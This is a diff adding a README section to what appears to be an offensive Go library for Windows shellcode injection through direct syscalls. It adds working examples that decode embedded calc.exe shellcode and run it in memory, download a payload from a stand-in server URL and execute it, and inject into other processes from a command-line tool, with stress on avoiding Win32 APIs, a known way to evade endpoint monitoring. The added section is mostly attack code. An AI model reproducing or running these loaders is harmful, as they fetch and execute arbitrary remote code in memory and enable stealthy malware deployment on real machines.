@@ -906,8 +906,132 @@ if status == 0 {
 
 ### Thread Creation and Injection
 
+#### Self-Injection Examples
+
+The library provides `NtInjectSelfShellcode` for complete shellcode self-injection using only direct syscalls. This function performs the full injection process: allocate RW memory → copy shellcode → change to RX → create thread using `NtCreateThreadEx`.
+
+**Example 1: Self-Injection with Embedded Shellcode**
+
 ```go
-// Self-injection using built-in function (recommended)
+package main
+
+import (
+    "fmt"
+    "strconv"
+    winapi "github.com/carved4/go-direct-syscall"
+)
+
+func main() {
+    // Prewarm syscall cache for better performance
+    winapi.PrewarmSyscallCache()
+    
+    // Embedded calc.exe shellcode (x64)
+    hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
+    
+    // Convert hex string to bytes
+    shellcode := make([]byte, len(hexString)/2)
+    for i := 0; i < len(hexString); i += 2 {
+        b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
+        shellcode[i/2] = byte(b)
+    }
+    
+    fmt.Printf("Injecting %d bytes of shellcode...\n", len(shellcode))
+    
+    // Perform self-injection using NtCreateThreadEx syscall
+    err := winapi.NtInjectSelfShellcode(shellcode)
+    if err != nil {
+        fmt.Printf("Self-injection failed: %v\n", err)
+    } else {
+        fmt.Println("Self-injection completed successfully!")
+    }
+}
+```
+
+**Example 2: Self-Injection with Downloaded Shellcode**
+
+```go
+package main
+
+import (
+    "fmt"
+    "io"
+    "net/http"
+    "time"
+    winapi "github.com/carved4/go-direct-syscall"
+)
+
+func downloadShellcode(url string) ([]byte, error) {
+    client := &http.Client{Timeout: 30 * time.Second}
+    
+    resp, err := client.Get(url)
+    if err != nil {
+        return nil, fmt.Errorf("download failed: %v", err)
+    }
+    defer resp.Body.Close()
+    
+    if resp.StatusCode != http.StatusOK {
+        return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
+    }
+    
+    payload, err := io.ReadAll(resp.Body)
+    if err != nil {
+        return nil, fmt.Errorf("failed to read payload: %v", err)
+    }
+    
+    return payload, nil
+}
+
+func main() {
+    // Prewarm syscall cache
+    winapi.PrewarmSyscallCache()
+    
+    // Download shellcode from remote server
+    url := "https://your-server.com/payload.bin"
+    fmt.Printf("Downloading shellcode from: %s\n", url)
+    
+    shellcode, err := downloadShellcode(url)
+    if err != nil {
+        fmt.Printf("Failed to download shellcode: %v\n", err)
+        return
+    }
+    
+    fmt.Printf("Downloaded %d bytes of shellcode\n", len(shellcode))
+    
+    // Inject the downloaded shellcode into current process
+    err = winapi.NtInjectSelfShellcode(shellcode)
+    if err != nil {
+        fmt.Printf("Self-injection failed: %v\n", err)
+    } else {
+        fmt.Println("Self-injection completed successfully!")
+    }
+}
+```
+
+**Example 3: Using Command-Line Tool (Pre-built)**
+
+```bash
+# Self-injection with embedded calc shellcode
+./cmd.exe -example
+
+# Self-injection with downloaded shellcode  
+./cmd.exe -url https://your-server.com/payload.bin -self
+
+# Remote injection into another process
+./cmd.exe -url https://your-server.com/payload.bin
+```
+
+**What NtInjectSelfShellcode Does:**
+
+1. **Allocates RW Memory**: Uses `NtAllocateVirtualMemory` with `PAGE_READWRITE`
+2. **Copies Shellcode**: Direct memory copy to allocated region
+3. **Changes Protection**: Uses `NtProtectVirtualMemory` to `PAGE_EXECUTE_READ`
+4. **Creates Thread**: Uses `NtCreateThreadEx` (true direct syscall, not Win32 API)
+5. **Waits & Cleanup**: Waits for completion and closes handles with `NtClose`
+
+All operations use **only direct syscalls** - no Win32 API dependencies!
+
+```go
+// Simple self-injection wrapper (minimal example)
 func SelfInject() error {
     shellcode := []byte{0x50, 0x51, 0x52, /* ... your shellcode ... */}
     return winapi.NtInjectSelfShellcode(shellcode)
